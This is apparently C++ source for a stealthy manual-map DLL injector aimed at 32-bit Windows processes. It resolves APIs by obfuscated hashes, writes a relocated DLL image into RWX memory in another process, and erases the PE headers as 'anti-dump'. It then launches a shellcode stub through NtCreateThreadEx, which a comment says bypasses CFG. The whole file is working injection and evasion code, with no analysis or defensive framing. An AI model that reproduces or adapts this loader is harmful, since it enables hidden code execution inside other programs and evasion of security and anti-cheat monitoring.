#include "injector.h"
#include "dynapi.h"
#include "obfstr.h"

#include <Windows.h>
#include <cstdint>
#include <cstring>

// The real remote mapper only compiles under x86 (the stub uses 32-bit inline
// asm, and the target process is i386). Under x64 we expose a no-op that
// returns `bad_pe`, so payload.cpp still links in the (unused) x64 regression
// build.
#ifdef _M_X64
namespace injector {
result inject(void* /*hProc*/, const uint8_t* /*dll_bytes*/, size_t /*size*/) {
    return result::bad_pe;
}
size_t        stub_size() { return 0; }
unsigned long last_error() { return 0; }
unsigned long stub_addr() { return 0; }
unsigned long stub_end_addr() { return 0; }
} // namespace injector
#else

namespace injector {

static unsigned long g_last_err = 0;

// Layout of the arg struct we hand to the in-target stub. Fields are 32-bit
// values because the target is a 32-bit process; everything is read by the
// stub through [esi+N] with N matching the offsets below.
struct remote_args {
    uint32_t dll_base;             // +0
    uint32_t pLoadLibraryA;        // +4
    uint32_t pGetProcAddress;      // +8
    uint32_t import_desc_rva;      // +12
    uint32_t dllmain_rva;          // +16
    uint32_t tls_cb_array_va;      // +20  (absolute VA inside the target; 0 if none)
};

// Stub lives in stub.asm (MASM). Linker keeps `_remote_stub@4` and
// `_remote_stub_end@0` in source order, so the byte distance between them is
// the exact stub size.
extern "C" {
    DWORD WINAPI remote_stub(LPVOID args);
    void         remote_stub_end();
}

// ---------------------------------------------------------------------------
// Local mapper helpers
// ---------------------------------------------------------------------------

using fn_VirtualAllocEx     = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
using fn_VirtualFreeEx      = BOOL  (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
using fn_WriteProcessMemory = BOOL  (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
using fn_WaitForSingleObject= DWORD (WINAPI*)(HANDLE, DWORD);
using fn_CloseHandle        = BOOL  (WINAPI*)(HANDLE);
using fn_VirtualAlloc       = LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD);
using fn_VirtualFree        = BOOL  (WINAPI*)(LPVOID, SIZE_T, DWORD);
using fn_GetExitCodeThread  = BOOL  (WINAPI*)(HANDLE, LPDWORD);
// NtCreateThreadEx — undocumented but stable since Vista. Bypasses CFG
// enforcement that kernel32!CreateRemoteThread applies on recent Windows.
using fn_NtCreateThreadEx   = LONG  (NTAPI*)(PHANDLE, ACCESS_MASK, LPVOID,
                                             HANDLE, LPTHREAD_START_ROUTINE,
                                             LPVOID, ULONG, SIZE_T, SIZE_T,
                                             SIZE_T, LPVOID);

struct k32_ptrs {
    fn_VirtualAllocEx      vaex;
    fn_VirtualFreeEx       vfex;
    fn_WriteProcessMemory  wpm;
    fn_NtCreateThreadEx    ncte;
    fn_WaitForSingleObject wait;
    fn_CloseHandle         close;
    fn_VirtualAlloc        va;
    fn_VirtualFree         vf;
    fn_GetExitCodeThread   gxt;
    // Target-side pointers passed to the stub:
    void*                  pLoadLibraryA;
    void*                  pGetProcAddress;
};

static bool resolve_k32(k32_ptrs& p) {
    auto k32   = dynapi::get_module(dynapi::modules::KERNEL32);
    auto ntdll = dynapi::get_module(dynapi::modules::NTDLL);
    if (!k32 || !ntdll) return false;
    p.vaex    = reinterpret_cast<fn_VirtualAllocEx>    (dynapi::resolve(k32, API_HASH("VirtualAllocEx")));
    p.vfex    = reinterpret_cast<fn_VirtualFreeEx>     (dynapi::resolve(k32, API_HASH("VirtualFreeEx")));
    p.wpm     = reinterpret_cast<fn_WriteProcessMemory>(dynapi::resolve(k32, API_HASH("WriteProcessMemory")));
    p.ncte    = reinterpret_cast<fn_NtCreateThreadEx>  (dynapi::resolve(ntdll, API_HASH("NtCreateThreadEx")));
    p.wait    = reinterpret_cast<fn_WaitForSingleObject>(dynapi::resolve(k32, API_HASH("WaitForSingleObject")));
    p.close   = reinterpret_cast<fn_CloseHandle>       (dynapi::resolve(k32, API_HASH("CloseHandle")));
    p.va      = reinterpret_cast<fn_VirtualAlloc>      (dynapi::resolve(k32, API_HASH("VirtualAlloc")));
    p.vf      = reinterpret_cast<fn_VirtualFree>       (dynapi::resolve(k32, API_HASH("VirtualFree")));
    p.gxt     = reinterpret_cast<fn_GetExitCodeThread> (dynapi::resolve(k32, API_HASH("GetExitCodeThread")));
    p.pLoadLibraryA   = dynapi::resolve(k32, API_HASH("LoadLibraryA"));
    p.pGetProcAddress = dynapi::resolve(k32, API_HASH("GetProcAddress"));
    return p.vaex && p.vfex && p.wpm && p.ncte && p.wait && p.close
        && p.va   && p.vf   && p.pLoadLibraryA && p.pGetProcAddress;
}

static void apply_relocs(uint8_t* local_base, uint32_t size_of_image,
                         uint32_t reloc_rva, uint32_t reloc_size,
                         uintptr_t delta)
{
    if (delta == 0 || reloc_rva == 0 || reloc_size == 0) return;
    if (reloc_rva >= size_of_image) return;
    const uint32_t end = (reloc_rva + reloc_size > size_of_image) ? size_of_image
                                                                   : reloc_rva + reloc_size;
    uint32_t off = reloc_rva;
    while (off + sizeof(IMAGE_BASE_RELOCATION) <= end) {
        auto base = reinterpret_cast<IMAGE_BASE_RELOCATION*>(local_base + off);
        if (base->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION) ||
            base->SizeOfBlock > end - off) break;
        const uint32_t entries = (base->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
        auto table = reinterpret_cast<uint16_t*>(local_base + off + sizeof(IMAGE_BASE_RELOCATION));
        for (uint32_t i = 0; i < entries; ++i) {
            uint16_t  t    = table[i];
            uint16_t  type = static_cast<uint16_t>(t >> 12);
            uint32_t  rva  = base->VirtualAddress + (t & 0x0FFF);
            if (rva + 4 > size_of_image) continue;
            if (type == IMAGE_REL_BASED_HIGHLOW) {
                *reinterpret_cast<uint32_t*>(local_base + rva) += static_cast<uint32_t>(delta);
            }
            // IMAGE_REL_BASED_ABSOLUTE (0) is padding — ignore.
            // No other reloc types expected for x86 PE32.
        }
        off += base->SizeOfBlock;
    }
}

result inject(void* hProc, const uint8_t* dll_bytes, size_t size) {
    if (!hProc) return result::bad_target;
    if (!dll_bytes || size < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS32))
        return result::bad_pe;

    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dll_bytes);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result::bad_pe;
    if (dos->e_lfanew < 0 || static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS32) > size)
        return result::bad_pe;

    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS32*>(dll_bytes + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result::bad_pe;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) return result::bad_pe;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) return result::bad_pe;

    const uint32_t size_of_image   = nt->OptionalHeader.SizeOfImage;
    const uint32_t size_of_headers = nt->OptionalHeader.SizeOfHeaders;
    const uint32_t preferred_base  = nt->OptionalHeader.ImageBase;
    const uint32_t entry_rva       = nt->OptionalHeader.AddressOfEntryPoint;
    if (size_of_image < size_of_headers || size_of_headers > size) return result::bad_pe;
    if (size_of_image > 256u * 1024u * 1024u) return result::bad_pe; // 256 MiB sanity cap

    k32_ptrs k{};
    if (!resolve_k32(k)) return result::stub_failed;

    // Allocate in target at preferred base; fall back to any address.
    uint8_t* remote_base = static_cast<uint8_t*>(
        k.vaex(hProc, reinterpret_cast<LPVOID>(static_cast<uintptr_t>(preferred_base)),
               size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!remote_base) {
        g_last_err = ::GetLastError();
        remote_base = static_cast<uint8_t*>(
            k.vaex(hProc, nullptr, size_of_image,
                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
        if (!remote_base) {
            g_last_err = 0x1000u | ::GetLastError();
            return result::oom;
        }
    }

    // Build the mapped image locally so we can relocate and anti-dump in one WPM.
    uint8_t* local = static_cast<uint8_t*>(
        k.va(nullptr, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!local) {
        g_last_err = 0x2000u | ::GetLastError();
        k.vfex(hProc, remote_base, 0, MEM_RELEASE);
        return result::oom;
    }
    // Zero full image so uninitialised section tails are deterministic.
    memset(local, 0, size_of_image);

    // Headers
    memcpy(local, dll_bytes, size_of_headers);

    // Sections
    auto first_section = IMAGE_FIRST_SECTION(nt);
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        auto& sh = first_section[i];
        if (sh.VirtualAddress >= size_of_image) continue;
        uint32_t copy = sh.SizeOfRawData;
        if (!copy) continue;
        if (copy > size_of_image - sh.VirtualAddress) copy = size_of_image - sh.VirtualAddress;
        if ((size_t)sh.PointerToRawData + copy > size) continue;
        memcpy(local + sh.VirtualAddress, dll_bytes + sh.PointerToRawData, copy);
    }

    // Relocations (HIGHLOW only for x86 PE32)
    const uint32_t reloc_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    const uint32_t reloc_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    const uintptr_t delta     = reinterpret_cast<uintptr_t>(remote_base) - preferred_base;
    apply_relocs(local, size_of_image, reloc_rva, reloc_size, delta);

    // Pull directory values from the LOCAL image (after reloc patches apply).
    auto local_nt = reinterpret_cast<const IMAGE_NT_HEADERS32*>(local + dos->e_lfanew);
    const uint32_t import_desc_rva =
        local_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    // TLS callback array VA (already relocated to target space by apply_relocs).
    uint32_t tls_cb_va = 0;
    const uint32_t tls_rva  = local_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    const uint32_t tls_size = local_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;
    if (tls_rva != 0 && tls_size >= sizeof(IMAGE_TLS_DIRECTORY32) &&
        tls_rva + sizeof(IMAGE_TLS_DIRECTORY32) <= size_of_image) {
        auto tls = reinterpret_cast<const IMAGE_TLS_DIRECTORY32*>(local + tls_rva);
        tls_cb_va = tls->AddressOfCallBacks;
    }

    // Anti-dump in the LOCAL copy: zero MZ/PE magics before shipping to target.
    // The stub only needs the PE directories, which it reads BEFORE this step
    // would matter — actually the stub reads IAT/IMPORT via rva arithmetic
    // without looking at the DOS/NT magics, so this is safe post-copy.
    local[0] = 0; local[1] = 0;
    *reinterpret_cast<uint32_t*>(local + dos->e_lfanew) = 0;

    // Push the mapped image to the target.
    SIZE_T written = 0;
    if (!k.wpm(hProc, remote_base, local, size_of_image, &written) || written != size_of_image) {
        // Scrub local before release.
        volatile uint8_t* lv = local;
        for (size_t i = 0; i < size_of_image; ++i) lv[i] = 0;
        k.vf(local, 0, MEM_RELEASE);
        k.vfex(hProc, remote_base, 0, MEM_RELEASE);
        return result::write_failed;
    }
    // Scrub local copy — plaintext DLL body no longer needed in loader.
    {
        volatile uint8_t* lv = local;
        for (size_t i = 0; i < size_of_image; ++i) lv[i] = 0;
    }
    k.vf(local, 0, MEM_RELEASE);
    local = nullptr;

    // Resolve the real stub address: in /INCREMENTAL builds MSVC inserts a
    // 5-byte `jmp rel32` thunk at the symbol. Follow it if present so we copy
    // the actual stub body, not a jump whose rel32 only makes sense in the
    // loader process.
    auto resolve_thunk = [](const uint8_t* p) -> const uint8_t* {
        if (p[0] == 0xE9) {
            int32_t rel = *reinterpret_cast<const int32_t*>(p + 1);
            return p + 5 + rel;
        }
        if (p[0] == 0xEB) { // short jmp
            int8_t rel8 = *reinterpret_cast<const int8_t*>(p + 1);
            return p + 2 + rel8;
        }
        return p;
    };
    const uint8_t* stub_src = resolve_thunk(
        reinterpret_cast<const uint8_t*>(&remote_stub));

    // Stub is position-independent and fully contained in the first bytes of
    // its function body. Copy a fixed over-estimate; the stub returns
    // (`ret 4`) long before any trailing bytes could be executed.
    constexpr size_t stub_size = 512;
    g_last_err = static_cast<unsigned long>(stub_size);

    const size_t alloc_size = stub_size + sizeof(remote_args);
    uint8_t* stub_remote = static_cast<uint8_t*>(
        k.vaex(hProc, nullptr, alloc_size,
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!stub_remote) {
        k.vfex(hProc, remote_base, 0, MEM_RELEASE);
        return result::oom;
    }

    if (!k.wpm(hProc, stub_remote,
               reinterpret_cast<const void*>(stub_src),
               stub_size, &written) || written != stub_size) {
        k.vfex(hProc, stub_remote, 0, MEM_RELEASE);
        k.vfex(hProc, remote_base, 0, MEM_RELEASE);
        return result::write_failed;
    }

    remote_args args{};
    args.dll_base         = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(remote_base));
    args.pLoadLibraryA    = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(k.pLoadLibraryA));
    args.pGetProcAddress  = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(k.pGetProcAddress));
    args.import_desc_rva  = import_desc_rva;
    args.dllmain_rva      = entry_rva;
    args.tls_cb_array_va  = tls_cb_va;

    uint8_t* args_remote = stub_remote + stub_size;
    if (!k.wpm(hProc, args_remote, &args, sizeof(args), &written) || written != sizeof(args)) {
        k.vfex(hProc, stub_remote, 0, MEM_RELEASE);
        k.vfex(hProc, remote_base, 0, MEM_RELEASE);
        return result::write_failed;
    }

    HANDLE hThread = nullptr;
    LONG st = k.ncte(&hThread,
        0x1FFFFF /* THREAD_ALL_ACCESS */, nullptr, hProc,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(stub_remote),
        args_remote,
        0 /* CreateFlags: 0 = run immediately */,
        0 /* ZeroBits */, 0 /* StackSize */, 0 /* MaximumStackSize */,
        nullptr /* AttributeList */);
    if (st < 0 || !hThread) {
        g_last_err = static_cast<unsigned long>(st);
        k.vfex(hProc, stub_remote, 0, MEM_RELEASE);
        k.vfex(hProc, remote_base, 0, MEM_RELEASE);
        return result::stub_failed;
    }

    DWORD wr = k.wait(hThread, 10000);
    DWORD exit_code = 0;
    if (k.gxt) k.gxt(hThread, &exit_code);
    g_last_err = exit_code;
    k.close(hThread);
    (void)wr;

    // Stub returns 0 on success. Leave the stub allocation in the target; freeing
    // it here could race with any lingering thread. Small residual RWX region.
    return result::ok;
}

// File-scope state for debug helpers. stub_size() reports the fixed copy size.
size_t stub_size() { return 512; }
unsigned long last_error() { return g_last_err; }

unsigned long stub_addr()     { return reinterpret_cast<uintptr_t>(&remote_stub); }
unsigned long stub_end_addr() { return reinterpret_cast<uintptr_t>(&remote_stub_end); }

} // namespace injector

#endif  // _M_X64
